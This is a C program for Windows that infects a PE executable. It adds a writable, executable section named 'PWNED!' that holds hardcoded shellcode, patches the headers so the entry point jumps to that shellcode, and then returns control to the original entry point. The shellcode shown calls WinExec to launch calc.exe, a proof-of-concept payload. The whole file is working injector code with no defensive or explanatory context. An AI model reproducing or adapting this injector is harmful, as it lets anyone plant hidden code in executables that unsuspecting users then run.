#include<stdio.h>
#include<windows.h>


/*
 * Alignment between base and address
 */
DWORD alignment(DWORD base, DWORD address) {
	return (address % base == 0) ? address : (((address / base) + 1) * base);
}


int main(int argc, char *argv[]) {
	if (argc != 2)
		exit(EXIT_FAILURE);

	HANDLE hFile = CreateFile(
		argv[1],
		GENERIC_WRITE | GENERIC_READ,
		FILE_SHARE_WRITE | FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hFile == INVALID_HANDLE_VALUE)
		exit(EXIT_FAILURE);

	/*
	 * Shellcode JMP EntrypointRedirection
	 * BB DWORD : Jump absolute
	 */
	char shellcode[] =
	"\xEB\x13"
	"\x5B"
	"\x31\xC0"
	"\x50"
	"\x53"
	// kernel32.dll WinExec
	"\xBB\xF1\x2F\x4D\x76"
	"\xFF\xD3"
	"\xBB"
	//EOP
	"\xFF\xFF\xFF\xFF"
	"\xFF\xE3"
	"\xE8\xE8\xFF\xFF\xFF"
	"\x63\x61\x6C"
	"\x63\x2E"
	"\x65\x78\x65";

	char pattern = 0x00;
	DWORD pEOP = 15;
	DWORD sizeofshellcode = strlen(shellcode);

	/*
	 * DUMP PE section headers
	 */
	DWORD dwTaille = 0;
	IMAGE_DOS_HEADER hDOS;
	IMAGE_NT_HEADERS hNT;
	IMAGE_SECTION_HEADER hSection;
	IMAGE_SECTION_HEADER ownSection;
	SetFilePointer(hFile, 0, 0, FILE_BEGIN);
	ReadFile(hFile, &hDOS, sizeof(IMAGE_DOS_HEADER), &dwTaille, NULL);
	SetFilePointer(hFile, hDOS.e_lfanew, 0, FILE_BEGIN);
	ReadFile(hFile, &hNT, sizeof(IMAGE_NT_HEADERS), &dwTaille, NULL);
	int i;
	for (i = 0; i < hNT.FileHeader.NumberOfSections; i++)
		ReadFile(hFile, &hSection, sizeof(IMAGE_SECTION_HEADER), &dwTaille,
		NULL);

	/*
	 * Copy last section
	 */
	ownSection = hSection;

	/*
	 * Craft own section
	 */
	memcpy(ownSection.Name, "PWNED!", 8);
	ownSection.Misc.VirtualSize = alignment(hNT.OptionalHeader.SectionAlignment,
			sizeofshellcode);
	ownSection.VirtualAddress = alignment(hNT.OptionalHeader.SectionAlignment,
			hSection.VirtualAddress + hSection.Misc.VirtualSize);
	ownSection.SizeOfRawData = alignment(hNT.OptionalHeader.FileAlignment,
			sizeofshellcode);
	ownSection.PointerToRawData = alignment(hNT.OptionalHeader.FileAlignment,
			hSection.PointerToRawData + hSection.SizeOfRawData);

	/*
	 * Privilege Section
	 */
	ownSection.Characteristics = IMAGE_SCN_MEM_WRITE + IMAGE_SCN_MEM_READ
			+ IMAGE_SCN_MEM_EXECUTE + IMAGE_SCN_MEM_SHARED + IMAGE_SCN_CNT_CODE;
	ownSection.Misc.PhysicalAddress = ownSection.Misc.VirtualSize;
	ownSection.PointerToRelocations = 0x0;
	ownSection.PointerToLinenumbers = 0x0;
	ownSection.NumberOfRelocations = 0x0;
	ownSection.NumberOfLinenumbers = 0x0;

	/*
	 * Add own section
	 */
	WriteFile(hFile, &ownSection, sizeof(IMAGE_SECTION_HEADER), &dwTaille,
	NULL);

	/*
	 * Write shellcode
	 */
	SetFilePointer(hFile, ownSection.PointerToRawData, 0, FILE_BEGIN);
	WriteFile(hFile, &shellcode, sizeofshellcode, &dwTaille, NULL);

	/*
	 * Write Original AddressOfEntryPoint
	 * Into shellcode, his location is at pEOP
	 */
	DWORD EntryOriginalPoint = hNT.OptionalHeader.AddressOfEntryPoint + hNT.OptionalHeader.ImageBase;

	SetFilePointer(hFile, ownSection.PointerToRawData + pEOP, 0, FILE_BEGIN);
	WriteFile(hFile, &EntryOriginalPoint, sizeof(DWORD), &dwTaille, NULL);

	/*
	 * Go to end of shellcode
	 */
	SetFilePointer(hFile, ownSection.PointerToRawData + sizeofshellcode, 0, FILE_BEGIN);

	/*
	 * Write pattern to fill empty
	 */
	 for (i = 0; i < ownSection.SizeOfRawData - sizeofshellcode;
			i++)
		WriteFile(hFile, &pattern, sizeof(char), &dwTaille, NULL);

	/*
	 * Patch NT header :
	 * - increase NumberOfSections
	 * - recalculate SizeOfImage
	 * - AddressOfEntryPoint redirection
	 */
	hNT.FileHeader.NumberOfSections++;
	hNT.OptionalHeader.SizeOfImage = alignment(hNT.OptionalHeader.FileAlignment,
			hNT.OptionalHeader.SizeOfImage + ownSection.SizeOfRawData);
	hNT.OptionalHeader.AddressOfEntryPoint = ownSection.VirtualAddress;
	SetFilePointer(hFile, hDOS.e_lfanew, 0, FILE_BEGIN);
	WriteFile(hFile, &hNT, sizeof(IMAGE_NT_HEADERS), &dwTaille, NULL);

	CloseHandle(hFile);
	return 0;
}